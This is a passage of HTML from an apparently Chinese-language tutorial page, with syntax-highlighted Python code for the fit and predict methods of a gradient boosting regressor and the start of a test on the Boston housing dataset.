style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef fit(self, X, y, n_estimators, lr, max_depth, min_samples_split, subsample=None):\r\n    self.init_val = self._get_init_val(y)\r\n\r\n    n = len(y)\r\n    y_hat = [self.init_val] * n\r\n    residuals = self._get_residuals(y, y_hat)\r\n\r\n    self.trees = []\r\n    self.lr = lr\r\n    for _ in range(n_estimators):\r\n        idx = range(n)\r\n        if subsample is not None:\r\n            k = int(subsample * n)\r\n            idx = choices(population=idx, k=k)\r\n        X_sub = [X[i] for i in idx]\r\n        residuals_sub = [residuals[i] for i in idx]\r\n        y_hat_sub = [y_hat[i] for i in idx]\r\n\r\n        tree = RegressionTree()\r\n        tree.fit(X_sub, residuals_sub, max_depth, min_samples_split)\r\n\r\n        self._update_score(tree, X_sub, y_hat_sub, residuals_sub)\r\n\r\n        y_hat = [y_hat_i + lr * res_hat_i for y_hat_i,\r\n                    res_hat_i in zip(y_hat, tree.predict(X))]\r\n\r\n        residuals = self._get_residuals(y, y_hat)\r\n        self.trees.append(tree)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab670543599514300216-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543599514300216-28\">28</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n_estimators</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lr</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_samples_split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">subsample</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">None</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">init_val</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_get_init_val</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">init_val</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">n</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">residuals</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_get_residuals</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">trees</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lr</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">_</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n_estimators</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">idx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">subsample </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">subsample *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">idx</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">choices</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">population</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">X_sub</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">residuals_sub</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">residuals</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">y_hat_sub</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-18\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RegressionTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X_sub</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">residuals_sub</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_samples_split</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_update_score</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X_sub</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat_sub</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">residuals_sub</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y_hat_i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">lr *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">res_hat_i </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat_i</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-25\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">res_hat_i </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-26\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670543599514300216-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">residuals</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_get_residuals</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543599514300216-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">trees</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0061 seconds] -->\r\n\n</div>\n<h2>2.6 预测一个样本</h2>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67054359d366045009\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _predict(self, Xi):\r\n    return self.fn(self.init_val + sum(self.lr * tree._predict(Xi) for tree in self.trees))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67054359d366045009-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67054359d366045009-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67054359d366045009-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Xi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67054359d366045009-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">init_val</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">lr *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Xi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tree </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">trees</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0066 seconds] -->\r\n\n</div>\n<h2>2.7 预测多个样本</h2>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6705435a1744674649\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef predict(self, X):\r\n    return [self._predict(Xi) for Xi in X]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a1744674649-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a1744674649-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6705435a1744674649-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a1744674649-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Xi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Xi </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n\n</div>\n<h1>3 效果评估</h1>\n<h2>3.1 main函数</h2>\n<p>使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6705435a4978052449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@run_time\r\ndef main():\r\n    print(\"Tesing the accuracy of GBDT regressor...\")\r\n\r\n    X, y = load_boston_house_prices()\r\n\r\n    X_train, X_test, y_train, y_test = train_test_split(\r\n        X, y, random_state=10)\r\n\r\n    reg = GradientBoostingRegressor()\r\n    reg.fit(X=X_train, y=y_train, n_estimators=4,\r\n            lr=0.5, max_depth=2, min_samples_split=2)\r\n\r\n    get_r2(reg, X_test, y_test)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6705435a4978052449-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6705435a4978052449-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">run_time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-2\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div 